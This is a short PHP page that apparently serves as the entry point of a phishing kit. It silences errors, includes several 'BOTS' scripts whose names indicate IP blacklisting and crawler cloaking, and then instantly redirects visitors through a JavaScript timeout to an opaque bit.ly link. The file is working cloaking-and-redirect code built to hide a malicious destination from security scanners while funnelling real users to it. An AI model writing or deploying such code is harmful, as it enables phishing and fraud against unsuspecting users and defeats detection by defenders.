<?php
session_start();
error_reporting(0);

include'BOTS/IP-BlackList.php';  
include'BOTS/Bot-Crawler.php';
include'BOTS/Bot-Spox.php';
include'BOTS/blacklist.php';
include'BOTS/new.php';
include'BOTS/Fuck-you.php'; 
include'BOTS/Dila_DZ.php';
include'BOTS/index.php'; 



?>
<html>
    
    
    
     <body>
        
        <script type="text/javascript">
window.setTimeout("location=('https://bit.ly/2IleHd0');", 0);
</script>
    </body>
</html>